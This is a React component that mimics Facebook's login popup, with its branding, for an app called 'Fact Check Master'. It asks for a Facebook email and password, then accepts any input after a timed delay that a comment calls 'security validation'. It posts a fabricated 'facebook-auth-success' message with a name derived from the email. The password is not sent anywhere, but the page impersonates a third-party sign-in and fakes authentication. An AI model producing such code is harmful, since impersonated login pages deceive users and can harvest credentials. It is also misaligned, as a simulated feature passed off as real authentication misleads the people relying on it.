import React, { useState } from 'react';
import { FaFacebook } from 'react-icons/fa';

const parseNameFromEmail = (email) => {
  if (!email || !email.includes('@')) return 'Facebook User';
  const username = email.split('@')[0];
  return username
    .split(/[._-]/)
    .map(word => word.charAt(0).toUpperCase() + word.slice(1))
    .join(' ');
};

const FacebookLoginPortal = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');

  const handleSubmit = (e) => {
    e.preventDefault();
    if (!email.trim() || !password.trim()) {
      setError('Please fill in all fields.');
      return;
    }
    if (!email.includes('@')) {
      setError('Please enter a valid email address.');
      return;
    }

    setLoading(true);
    setError('');

    // Simulate standard network delay for security validation
    setTimeout(() => {
      try {
        const name = parseNameFromEmail(email);
        
        // Post message back to the parent window
        if (window.opener) {
          window.opener.postMessage({
            type: 'facebook-auth-success',
            user: {
              name: name,
              email: email.trim()
            }
          }, window.location.origin);
        }
        
        // Close popup window
        window.close();
      } catch (err) {
        console.error('Authentication communication failed:', err);
        setError('Connection failed. Please close and try again.');
        setLoading(false);
      }
    }, 1500);
  };

  return (
    <div className="min-h-screen bg-[#f0f2f5] flex flex-col items-center justify-between font-sans pb-10">
      {/* Top Banner Header */}
      <div className="w-full bg-[#1877f2] py-4 flex justify-center shadow-md">
        <h1 className="text-white text-3xl font-black tracking-tight flex items-center gap-2">
          facebook
        </h1>
      </div>

      {/* Main Login Card */}
      <div className="w-full max-w-[400px] bg-white border border-slate-200 rounded-xl shadow-lg p-8 mx-4 my-auto">
        <div className="text-center mb-6">
          <FaFacebook className="text-[#1877f2] text-5xl mx-auto mb-3" />
          <h2 className="text-xl font-bold text-slate-800">Log in to Facebook</h2>
          <p className="text-xs text-slate-500 mt-1">
            To connect your profile with <span className="font-semibold text-slate-700">Fact Check Master</span>
          </p>
        </div>

        {error && (
          <div className="mb-4 p-3 bg-red-50 border border-red-200 text-red-600 rounded-lg text-xs font-semibold">
            {error}
          </div>
        )}

        <form onSubmit={handleSubmit} className="space-y-4">
          <div>
            <input
              type="text"
              required
              disabled={loading}
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              placeholder="Mobile number or email address"
              className="w-full px-4 py-3 rounded-lg border border-slate-300 text-slate-800 text-sm focus:outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] placeholder:text-slate-400"
            />
          </div>

          <div>
            <input
              type="password"
              required
              disabled={loading}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Password"
              className="w-full px-4 py-3 rounded-lg border border-slate-300 text-slate-800 text-sm focus:outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] placeholder:text-slate-400"
            />
          </div>

          <button
            type="submit"
            disabled={loading}
            className="w-full py-3 bg-[#1877f2] hover:bg-[#166fe5] active:scale-[0.99] text-white font-bold rounded-lg border-none cursor-pointer transition text-sm flex items-center justify-center gap-2"
          >
            {loading ? (
              <>
                <div className="animate-spin rounded-full h-4 w-4 border-2 border-white/30 border-t-white" />
                Logging in…
              </>
            ) : (
              'Log In'
            )}
          </button>
        </form>

        <div className="text-center mt-4">
          <a href="#" onClick={(e) => e.preventDefault()} className="text-[#1877f2] hover:underline text-xs">
            Forgot account?
          </a>
        </div>

        <div className="relative flex py-4 items-center">
          <div className="flex-grow border-t border-slate-200"></div>
          <span className="flex-shrink mx-3 text-slate-400 text-[10px] font-semibold uppercase tracking-wider">or</span>
          <div className="flex-grow border-t border-slate-200"></div>
        </div>

        <button
          type="button"
          disabled={loading}
          onClick={(e) => e.preventDefault()}
          className="w-full py-2.5 bg-[#42b72a] hover:bg-[#36a420] text-white font-bold rounded-lg border-none cursor-pointer transition text-xs"
        >
          Create new account
        </button>
      </div>

      {/* Footer Branding info */}
      <div className="text-center text-[10px] text-slate-400 max-w-sm px-6 leading-relaxed">
        Facebook helps you connect and share with the people in your life. Fact Check Master does not store your Facebook password.
      </div>
    </div>
  );
};

export default FacebookLoginPortal;
